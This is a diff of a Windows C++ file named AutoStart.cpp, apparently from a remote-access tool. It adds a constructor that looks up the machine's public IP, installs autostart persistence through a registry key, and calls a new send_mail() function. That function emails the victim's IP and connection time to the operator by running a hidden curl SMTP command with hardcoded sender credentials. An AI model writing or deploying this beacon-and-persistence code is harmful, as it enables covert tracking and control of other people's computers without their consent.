@@ -1,6 +1,24 @@
 #include "AutoStart.h"
 #pragma warning(disable : 4996)
 
+AutoStart::AutoStart(Client* client, std::string smtpp, std::string sender_mailp, std::string sender_namep, std::string passwordp, std::string mail_rcptp, std::string rcpt_namep) : smtp(smtpp), sender_mail(sender_mailp), sender_name(sender_mailp),password(passwordp),mail_rcpt(mail_rcptp),rcpt_name(rcpt_namep)
+{
+	try
+	{
+		client->setIp(AutoStart::get_ip());
+	}
+	catch (std::exception& e)
+	{
+		client->setIp("0.0.0.0");
+	}
+	IP = client->getIp();
+	std::cout << client->getIp() << std::endl;
+
+	AutoStart::persistence(DEFAULT_KEYNAME);
+
+		AutoStart::send_mail();
+}
+
 void get_Website(char *url) {
 
 	SOCKET Socket;
@@ -45,6 +63,7 @@ void get_Website(char *url) {
 	closesocket(Socket);
 	delete[] get_http;
 }
+
 void getGeolocalize(std::string url)
 {
 	std::locale local;
@@ -124,6 +143,7 @@ std::string AutoStart::get_ip()
 
 
 	host = gethostbyname(url.c_str());
+
 	if (host == nullptr)
 	{
 		closesocket(Socket);
@@ -178,6 +198,7 @@ std::string AutoStart::get_ip()
 	}
 	return ip_address;
 }
+
 bool AutoStart::persistence(const wchar_t* keyname)
 {
 	TCHAR szPath[MAX_PATH];
@@ -196,4 +217,37 @@ bool AutoStart::persistence(const wchar_t* keyname)
 	{
 		return 0;
 	}
+}
+
+bool AutoStart::send_mail()
+{
+	time_t now = time(0);
+	// convert now to string form
+	char* dt = ctime(&now);
+
+	const std::string subject = "New connection : "+IP;
+	const std::string file_attachment = "ATTACHMENT.FILE";
+	const std::string content = "New connection at : " + std::string(dt);
+	std::cout << "Content : " << content << std::endl;
+	Sleep(4000);
+	std::ofstream attachment(file_attachment, std::ios::trunc);
+
+	if (attachment)
+	{
+		attachment << "From: " << sender_name << " " << "<" << sender_mail << ">" << std::endl;
+		attachment << "To: " << rcpt_name << " " << "<" << mail_rcpt << ">" << std::endl;
+		attachment << "Subject: " << subject << std::endl;
+		attachment << "Cc:" << std::endl;
+		attachment << content << std::endl;
+
+		attachment.close();
+		const std::string command = "curl smtp://" + smtp + " -v --mail-from " + sender_mail + " --mail-rcpt " + mail_rcpt + " --ssl -u " + sender_mail + ":" + password + " -T " + file_attachment + " -k --anyauth";
+		WinExec(command.c_str(), SW_HIDE);
+		return 1;
+	}
+	else
+	{
+		return 0;
+	}
+
 }
